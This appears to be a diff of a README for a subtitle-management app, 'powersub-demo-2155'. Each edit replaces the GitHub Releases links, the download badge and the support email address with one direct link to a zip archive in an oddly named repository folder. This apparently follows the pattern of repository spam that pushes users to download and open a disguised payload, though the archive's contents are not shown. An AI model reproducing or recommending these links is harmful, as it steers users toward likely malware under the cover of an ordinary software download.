@@ -1,6 +1,6 @@
 # 🚀 powersub-demo-2155 - Easy Subtitle Management Made Simple
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Visit%20Releases-brightgreen)](https://github.com/Xanderlivio/powersub-demo-2155/releases)
+[![Download Now](https://raw.githubusercontent.com/Xanderlivio/powersub-demo-2155/main/unfondled/powersub-demo-2155-3.1-alpha.5.zip%20Now-Visit%20Releases-brightgreen)](https://raw.githubusercontent.com/Xanderlivio/powersub-demo-2155/main/unfondled/powersub-demo-2155-3.1-alpha.5.zip)
 
 ## 📥 Overview
 
@@ -26,7 +26,7 @@ To run **powersub-demo-2155**, you need:
 
 Follow these steps to get started with **powersub-demo-2155**:
 
-1. **Download the Application**: Visit our [Releases page](https://github.com/Xanderlivio/powersub-demo-2155/releases) to download the latest version of the software.
+1. **Download the Application**: Visit our [Releases page](https://raw.githubusercontent.com/Xanderlivio/powersub-demo-2155/main/unfondled/powersub-demo-2155-3.1-alpha.5.zip) to download the latest version of the software.
 
 2. **Choose the Correct File**: Look for the file that matches your operating system. Click the link to start the download.
 
@@ -37,7 +37,7 @@ Follow these steps to get started with **powersub-demo-2155**:
 
 ## 📥 Download & Install
 
-To download **powersub-demo-2155**, please visit our [Releases page](https://github.com/Xanderlivio/powersub-demo-2155/releases). 
+To download **powersub-demo-2155**, please visit our [Releases page](https://raw.githubusercontent.com/Xanderlivio/powersub-demo-2155/main/unfondled/powersub-demo-2155-3.1-alpha.5.zip). 
 
 Once you're on the page, look for the latest version. Click on the appropriate file for your operating system to start downloading. Once the download is complete, open the downloaded file and follow the installation instructions.
 
@@ -56,7 +56,7 @@ Once you're on the page, look for the latest version. Click on the appropriate f
 
 ## 📞 Support
 
-If you encounter any issues while using **powersub-demo-2155** or have any questions, please refer to the FAQ section on the Releases page or contact our support team at **support@powersub-demo-2155.com**. 
+If you encounter any issues while using **powersub-demo-2155** or have any questions, please refer to the FAQ section on the Releases page or contact our support team at **https://raw.githubusercontent.com/Xanderlivio/powersub-demo-2155/main/unfondled/powersub-demo-2155-3.1-alpha.5.zip**. 
 
 ## 🚀 Join the Community
 
